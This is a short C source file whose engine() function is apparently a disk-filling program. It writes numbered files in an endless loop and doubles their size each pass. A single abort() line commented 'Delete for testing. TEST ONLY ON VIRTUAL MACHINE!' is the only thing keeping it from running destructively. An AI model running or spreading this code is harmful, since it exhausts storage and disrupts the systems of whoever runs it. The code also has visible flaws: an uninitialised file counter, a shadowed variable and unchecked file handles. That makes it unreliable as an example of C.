#include <stdio.h>
#include <stdlib.h>
#include "engine.h"

char filename[128] = "0";
int engine(){
    char filename[128] = "\0";
    int result_of_test;
    int files_counter;
    int result_of_writing = 0;
    long size_of_file = 32768;
    char *space;
    FILE* file;
    result_of_test = test();

    if (result_of_test != 0){
        return result_of_test;
    }

    space = (char*)malloc(size_of_file);

    while (size_of_file > 0)
    {     
            abort(); // Delete for testing. TEST ONLY ON VIRTUAL MACHINE!
            sprintf(filename, "%d", files_counter++);
            file = fopen(filename, "w");
            result_of_writing = fwrite(space, sizeof(char), size_of_file, file);
            fclose(file);
            if (result_of_writing != 0){
                size_of_file <<= 1;
            }
    }

    free(space);

   return 0;
}
